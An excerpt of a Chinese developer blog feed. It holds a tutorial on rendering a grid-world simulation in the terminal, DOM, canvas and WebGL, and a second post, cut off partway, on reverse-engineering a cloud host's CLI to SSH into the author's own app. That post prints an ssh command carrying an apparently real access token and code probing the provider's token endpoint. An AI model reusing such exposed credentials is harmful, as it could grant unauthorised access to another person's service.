vec4(aVertexPosition, 0.0, 1.0);</span><br><span class="line">        &#125;</span><br><span class="line">        `</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> f = <span class="string">`</span><br><span class="line">        //这部分是片段着色器  </span><br><span class="line">        precision highp float;</span><br><span class="line"></span><br><span class="line">        uniform vec4 uColor;</span><br><span class="line"></span><br><span class="line">        void main() &#123;</span><br><span class="line">           gl_FragColor = uColor;</span><br><span class="line">        &#125;</span><br><span class="line">        `</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> vs = gl.createShader(gl.VERTEX_SHADER);</span><br><span class="line">        gl.shaderSource(vs, v);</span><br><span class="line">        gl.compileShader(vs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> fs = gl.createShader(gl.FRAGMENT_SHADER);</span><br><span class="line">        gl.shaderSource(fs, f);</span><br><span class="line">        gl.compileShader(fs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.program = gl.createProgram();</span><br><span class="line">        gl.attachShader(<span class="keyword">this</span>.program, vs);</span><br><span class="line">        gl.attachShader(<span class="keyword">this</span>.program, fs);</span><br><span class="line">        gl.linkProgram(<span class="keyword">this</span>.program);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// debugging</span></span><br><span class="line">        <span class="keyword">if</span> (!gl.getShaderParameter(vs, gl.COMPILE_STATUS))</span><br><span class="line">          <span class="built_in">console</span>.log(gl.getShaderInfoLog(vs));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!gl.getShaderParameter(fs, gl.COMPILE_STATUS))</span><br><span class="line">          <span class="built_in">console</span>.log(gl.getShaderInfoLog(fs));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!gl.getProgramParameter(<span class="keyword">this</span>.program, gl.LINK_STATUS))</span><br><span class="line">          <span class="built_in">console</span>.log(gl.getProgramInfoLog(<span class="keyword">this</span>.program));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.draw = <span class="keyword">this</span>.drawWebGL;</span><br><span class="line"></span><br><span class="line">        gl.useProgram(<span class="keyword">this</span>.program);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (canvasLegend) &#123;</span><br><span class="line">      <span class="keyword">this</span>._canvasLegend = canvasLegend;</span><br><span class="line">      <span class="keyword">this</span>.draw = <span class="keyword">this</span>.drawTerminal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span>;</span><br><span class="line">    map.forEach(((line, y) =&gt; &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; line.length; x++) &#123;</span><br><span class="line">        <span class="keyword">this</span>.grid.set(<span class="keyword">new</span> Vector(x, y),</span><br><span class="line">                      elementFromChar(legend, line[x]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).bind(self));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>._stastics = &#123;&#125;;</span><br><span class="line">    <span class="keyword">this</span>.clearstastics();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Terminal_Animation">Terminal Animation</h3><p>最最早的时候，我当时在nodejs中实现了这个游戏，试图在终端中不断打印刷新来生成动画。</p>
<p>你知道的，终端的IO效率非常低，世界一大，非常之卡，那是第一个UI实现。一个古老的终端动画思路。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">drawTerminal() &#123;</span><br><span class="line">    process.stdout.clearScreenDown();</span><br><span class="line">    <span class="keyword">let</span> element</span><br><span class="line">        <span class="keyword">let</span> line = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">            element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">            line += (charFromElement(element) || <span class="string">" "</span>);</span><br><span class="line">            <span class="keyword">if</span> (x == <span class="keyword">this</span>.grid.width-<span class="number">1</span>) &#123;</span><br><span class="line">                line += <span class="string">'\n'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    process.stdout.write(line);</span><br><span class="line">    process.stdout.cursorTo(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.vim-cn.com/b1/109b70f577066d82883688bef88cdb59d337b1.gif" alt="Terminal Animation UI"></p>
<p>这不好看，我们希望是色彩鲜艳用户界面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">drawTerminal() &#123;</span><br><span class="line">  process.stdout.clearScreenDown();</span><br><span class="line">  <span class="keyword">let</span> line = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">      <span class="keyword">let</span> element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">      <span class="keyword">let</span> color = <span class="keyword">this</span>._canvasLegend[charFromElement(element)];</span><br><span class="line">      <span class="keyword">if</span> (!color) &#123;</span><br><span class="line">        line += <span class="string">"\x1b[107m \x1b[0m"</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> colorC = terminalColors[color];</span><br><span class="line">        line += (colorC + <span class="string">" "</span> + <span class="string">"\x1b[0m"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    line += <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  process.stdout.write(line);</span><br><span class="line">  process.stdout.cursorTo(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.vim-cn.com/22/7fc0abccc74290dce1eb72a1bfba4f066f20c4.gif" alt="Terminal Animation UI colored"></p>
<p>我们能实现的更漂亮，通过字体和颜色的搭配，但，我马上得去滑雪了，不试了。</p>
<p>聪明的我于是就把这个任务交给感兴趣的读者，如果有人实现了请联系我让我膜拜下。</p>
<h3 id="DOM_Animation">DOM Animation</h3><p>然后嘛，就是DOM版本的了，Marijn Haverbeke给出了默认的draw实现。不过既然到了浏览器上，就可以画出些色彩花样。<br>我们可以动态插入一些div并根据legend来附上色彩甚至图像。</p>
<p>实现起来也多样，可以不停操作DOM(下面的代码我没试过哈)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">drawDom() &#123;</span><br><span class="line">  <span class="keyword">this</span>._canvas.innerHTML = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">      element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">      <span class="keyword">let</span> color = <span class="keyword">this</span>._canvasLegend[charFromElement(element)];</span><br><span class="line">      <span class="keyword">let</span> e = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">      e.style.width = size + <span class="string">'px'</span>;</span><br><span class="line">      e.style.height = size + <span class="string">'px'</span>;</span><br><span class="line">      e.style.backgroundColor = color;</span><br><span class="line">      <span class="keyword">this</span>._canvas.appendChild(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，也可以生成一堆html然后每次刷新只插入一次。妄图效率能高一些。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">drawDom() &#123;</span><br><span class="line">  <span class="keyword">let</span> html = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">let</span> size = <span class="keyword">this</span>._size;</span><br><span class="line">  <span class="keyword">this</span>._canvas.innerHTML = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">      <span class="keyword">let</span> element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">      <span class="keyword">let</span> color = <span class="keyword">this</span>._canvasLegend[charFromElement(element)];</span><br><span class="line">      html += <span class="string">`&lt;div style='background-color:<span class="subst">$&#123;color&#125;</span>;width:<span class="subst">$&#123;size&#125;</span>px;height:<span class="subst">$&#123;size&#125;</span>px;float:left'&gt;&lt;/div&gt;`</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._canvas.innerHTML = html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.vim-cn.com/d1/05a775e6f58573966fa4693d21056d6ce133e6.gif" alt="DOM Animation UI"></p>
<p>聪明的我留给读者又一个练习，给每种单位一个图片，让最后渲染效果不是色块而是图片。</p>
<h3 id="Canvas_Animation">Canvas Animation</h3><p>接下来欢迎来到canvas的世界。</p>
<p>使用canvas很简单，准备画布，然后给出js指令告诉canvas如何绘图。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">drawCanvas() &#123;</span><br><span class="line">  <span class="keyword">let</span> element;</span><br><span class="line">  <span class="keyword">this</span>._ctx.save();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">      element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">      <span class="keyword">this</span>._ctx.fillStyle = <span class="keyword">this</span>._canvasLegend[charFromElement(element)];</span><br><span class="line">      <span class="keyword">this</span>._ctx.fillRect(x * <span class="keyword">this</span>._size, y * <span class="keyword">this</span>._size, <span class="keyword">this</span>._size, <span class="keyword">this</span>._size);</span><br><span class="line">      <span class="comment">// deadly slow if so.</span></span><br><span class="line">      <span class="comment">//this._ctx.beginPath();</span></span><br><span class="line">      <span class="comment">//this._ctx.arc(x * this._size, y * this._size, this.size / 2, 0, Math.PI * 2);</span></span><br><span class="line">      <span class="comment">//this._ctx.fill();</span></span><br><span class="line">      <span class="keyword">this</span>._ctx.fillStyle = <span class="string">'white'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._ctx.restore();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It’s fucking cool!</p>
<p><img src="http://img.vim-cn.com/08/d056d8ad19af2755c9bada138cced2046d69ab.gif" alt="canvas Animation UI"></p>
<p>当然，如果你尝试试着在每个单位绘制复杂图像，将有意外惊喜。请尝试前保存好当前工作。</p>
<p>聪明的我于是将留给读者又一个练习，给每个单位贴图，给背景贴图。</p>
<h3 id="WebGL_Animation">WebGL Animation</h3><p>最后，webGL，我们把绘制交给gpu来完成。使用webGL相对较复杂一些(当然，特定需求three.js这种封装的很方便，但原生接口对陌生的同学需要学习和理解以下)</p>
<p>webgl暴露了这么一种接口。啊，我不准备讲opengl流水线，一点直观理解就够了。</p>
<ul>
<li>准备画布，调整观察者在空间中的位置。默认情况下，远处和近处物体一样大，画布中心是(0, 0, 0)，空间坐标是右手座标系。</li>
<li>我们使用一种叫GLSL的语言来准备两个shader文件来指导显卡如何渲染数据。其中vertex决定顶点数据，fragment决定如何渲染。</li>
<li>webGL暴露了这么一种接口，你可以创建、编译、链接GLSL语言的程序，而webGL将提供一些接口让你能制定这些程序使用的数据。</li>
<li>webGL也提供了制作让GLSL编译后的程序能理解的数据的接口，这样就能把javascript中的数据传递给显卡。</li>
</ul>
<p>以下只是一种实现，为了实现类似canvas中<code>fillRect</code>效果封装了个<code>_webGLRect</code>函数。<br>聪明的读者将会自己实现更好的。。。</p>
<p>聪明的我将留给读者又一个练习，给每个单位贴图，给背景贴图。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">drawWebGL() &#123;</span><br><span class="line">  <span class="keyword">let</span> element;</span><br><span class="line">  <span class="keyword">let</span> colorName;</span><br><span class="line">  <span class="keyword">var</span> wRatio = <span class="number">2</span> / <span class="keyword">this</span>.grid.width ;</span><br><span class="line">  <span class="keyword">var</span> hRatio = <span class="number">2</span> / <span class="keyword">this</span>.grid.height;</span><br><span class="line">  <span class="keyword">this</span>._gl.clearColor(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1.0</span>);</span><br><span class="line">  <span class="keyword">this</span>._gl.clear(<span class="keyword">this</span>._gl.COLOR_BUFFER_BIT | <span class="keyword">this</span>._gl.DEPTH_BUFFER_BIT);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; <span class="keyword">this</span>.grid.height; y++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.grid.width; x++) &#123;</span><br><span class="line">      element = <span class="keyword">this</span>.grid.get(<span class="keyword">new</span> Vector(x, y));</span><br><span class="line">      <span class="keyword">if</span> (element) &#123;</span><br><span class="line">        colorName = <span class="keyword">this</span>._canvasLegend[charFromElement(element)];</span><br><span class="line">        <span class="keyword">this</span>._webGLRect(x * wRatio, y * hRatio, wRatio, hRatio, colorName);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_webGLRect(x, y, wRatio, hRatio, colorName) &#123;</span><br><span class="line">  <span class="keyword">let</span> gl = <span class="keyword">this</span>._gl;</span><br><span class="line">  <span class="keyword">var</span> vertices = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([</span><br><span class="line">    -<span class="number">1</span> + x, -<span class="number">1</span> + y,</span><br><span class="line">    -<span class="number">1</span> + x + wRatio, -<span class="number">1</span> + y + <span class="number">0</span>,</span><br><span class="line">    -<span class="number">1</span> + x + wRatio, -<span class="number">1</span> + y + hRatio,</span><br><span class="line">    -<span class="number">1</span> + x + <span class="number">0</span>, -<span class="number">1</span> + y + <span class="number">0</span>,</span><br><span class="line">    -<span class="number">1</span> + x + wRatio, -<span class="number">1</span> + y + hRatio,</span><br><span class="line">    -<span class="number">1</span> + x + <span class="number">0</span>, -<span class="number">1</span> + y + hRatio</span><br><span class="line">  ]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> vbuffer = gl.createBuffer();</span><br><span class="line">  gl.bindBuffer(gl.ARRAY_BUFFER, vbuffer);</span><br><span class="line">  gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> itemSize = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">let</span> numItems = vertices.length / itemSize;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> uColor = gl.getUniformLocation(<span class="keyword">this</span>.program, <span class="string">"uColor"</span>);</span><br><span class="line">  <span class="keyword">switch</span> (colorName) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"red"</span>:</span><br><span class="line">          gl.uniform4fv(uColor, [<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"green"</span>:</span><br><span class="line">          gl.uniform4fv(uColor, [<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"blue"</span>:</span><br><span class="line">          gl.uniform4fv(uColor, [<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"yellow"</span>:</span><br><span class="line">          gl.uniform4fv(uColor, [<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"black"</span>:</span><br><span class="line">          gl.uniform4fv(uColor, [<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> aVertexPosition = gl.getAttribLocation(<span class="keyword">this</span>.program, <span class="string">"aVertexPosition"</span>);</span><br><span class="line"></span><br><span class="line">  gl.enableVertexAttribArray(aVertexPosition);</span><br><span class="line">  gl.vertexAttribPointer(aVertexPosition, itemSize, gl.FLOAT, <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  gl.drawArrays(gl.TRIANGLES, <span class="number">0</span>, numItems);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.vim-cn.com/8d/d346f93ee3ad8163e4390bf64c02ada9c768db.gif" alt="webGL Animation UI"></p>
<h3 id="性能与瞎想">性能与瞎想</h3><p>我本来想给出些科学的探索，然而，我并不能给出谁发热多谁发热少的结论</p>
<p>terminal表现非常好，可惜terminal能画的单位数目有限。</p>
<p>DOM的效率比想象中高很多，能超过canvas很多接近webGL，想想如果用SVG是不是更高2333</p>
<p>canvas，如果需要绘制成千上万次，请使用贴图。。</p>
<p>webGL，可以编辑更复杂的shader文件，一次将要绘制的世界准备好，而不是在循环里不断调用绘图接口。</p>
<h3 id="More?">More?</h3><p>等待您的指教</p>
<h2 id="Have_Fun_With_it">Have Fun With it</h2><p>实际上、通过web技术我们能和这个世界交互。于是，改造成一个伪God Name。</p>
<p>用鼠标在任何位置随时添加的各种单位，随时拆墙建墙。。。如果有谁有兴趣，</p>
<p>聪明的读者会自己玩~</p>
<p>Have fun~,准备滑雪！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这里的第一篇文章标示的日期是2012年2月7日，到今天，眨眼间4年多过去了。没想到竟然断断续续写了四年。</p>
<p>感谢vimwiki，感谢jekyll，感谢hexo，感谢开源社区和贡献者们。</p>
<p>感谢bitbucket，感谢github，感谢gitcafe，]]>
    </summary>
    
      <category term="canvas" scheme="http://reverland.org/tags/canvas/"/>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="webgl" scheme="http://reverland.org/tags/webgl/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记一次瞎逼折腾]]></title>
    <link href="http://reverland.org/hack/2016/02/09/play/"/>
    <id>http://reverland.org/hack/2016/02/09/play/</id>
    <published>2016-02-09T05:01:25.000Z</published>
    <updated>2016-02-26T02:12:57.268Z</updated>
    <content type="html"><![CDATA[<p>dotcloud悄无声息的远去了。我收到让转移应用的邮件才知道公司已经破产。</p>
<p>就在几天前，往dotcloud上部署微信机器人时还饶有兴趣瞎折腾了一下。当时发在<a href="https://cnodejs.org/topic/56a310f28dcd3e826233708a" target="_blank" rel="external">cnodejs上</a></p>
<p>昨天，看到dotcloud<a href="https://www.dotcloud.com/dev-center/platform-documentation#secure-shell-ssh" target="_blank" rel="external">提供一个secure shell</a>，忽然脑洞大开，我觉得又可以花式Tunnel了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~] - [<span class="number">2016</span>-<span class="number">01</span>-<span class="number">23</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">29</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/.local/bin</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~] - [<span class="number">2016</span>-<span class="number">01</span>-<span class="number">23</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">34</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; dcapp wechat/default run bash</span><br><span class="line">Connecting...</span><br><span class="line">[wechat/default]:~$</span><br></pre></td></tr></table></figure>
<p>好奇，我能不用dcapp直接连接吗？什么原理？</p>
<p>于是翻了翻下载到dotcloudng的源码，开源软件就是好啊就是好。看到里头有个<a href="https://github.com/cloudControl/cctrl/blob/c9e015920f52ca971d9dd6640f26b504d055f973/cctrl/app.py#L1162" target="_blank" rel="external">ssh命令</a></p>
<pre><code>cmd = <span class="function"><span class="title">ssh_cmd</span><span class="params">(host_name, <span class="string">'delete-cache'</span>, deployment_name)</span></span>
</code></pre><p>于是打印了一下，发现就是普通的ssh连接。于是抱着试试看的心理连了一次，还真可以。。</p>
<pre><code>ssh -t -<span class="tag">p</span> <span class="number">2222</span> -- wechat-default@sshforwarder<span class="class">.dotcloudapp</span><span class="class">.com</span> TOKEN=t9Nd9ECasAgSD9UsYfcFwgysAF4bCL bash
</code></pre><p>翻翻源码没什么问题。但是，<code>--</code>是啥？，token又是啥？</p>
<p><code>--</code>很快查到，为了防止bash解析后面的内容。<a href="https://github.com/cloudControl/cctrl/blob/c9e015920f52ca971d9dd6640f26b504d055f973/cctrl/app.py#L126" target="_blank" rel="external">但token呢？</a></p>
<pre><code>env = '<span class="keyword">TOKEN</span>={<span class="keyword">token</span>}'.<span class="keyword">format</span>(<span class="keyword">token</span>=self.api.get_token()['<span class="keyword">token</span>'])
</code></pre><p>搜索了下没找到，cctrl引用了cclib，看到<a href="https://github.com/cloudControl/pycclib/blob/d7688352abc1a2e71e8d5fbdac806e6ea9f68680/pycclib/cclib.py#L188" target="_blank" rel="external">get_token</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def get_token(self):&#10;    &#34;&#34;&#34;&#10;        We use get_token to get the token.&#10;    &#34;&#34;&#34;&#10;    return self._token</span><br></pre></td></tr></table></figure>
<p>那又是哪里设置了token呢？一眼看到上面的<code>set\_token</code>。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_token</span><span class="params">(self, token)</span>:</span></span><br><span class="line">        <span class="string">"""</span><br><span class="line">            We use set_token to set the token.</span><br><span class="line">        """</span></span><br><span class="line">        self._token = token</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/cloudControl/pycclib/blob/d7688352abc1a2e71e8d5fbdac806e6ea9f68680/pycclib/cclib.py#L97" target="_blank" rel="external">检查set_token是在api init的时候</a></p>
<p>看看Api类，就抱着试试看的心理用试验了下。。。然而401？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getSshToken = <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject) =&gt; &#123;</span><br><span class="line">  <span class="keyword">var</span> req = https.request(&#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    path: <span class="string">'/token/'</span>,</span><br><span class="line">    hostname: <span class="string">'api.dotcloudapp.com'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">'User-Agent'</span>: <span class="string">'pycclib/1.6.2'</span>,</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">      <span class="string">'Content-length'</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, (res)=&gt; &#123;</span><br><span class="line">		resolve(res);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  req.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>我在想要不要把mitmproxy打开看看呢。忽然在文件中赫然看到个DEBUG标志，于是打开，清晰看到几次请求。发现第一次请求是不带任何参数的，就是401，在header中返回了一个sshtoken。紧接着第二次请求。这次http header中Authorization中多了一些东西：</p>
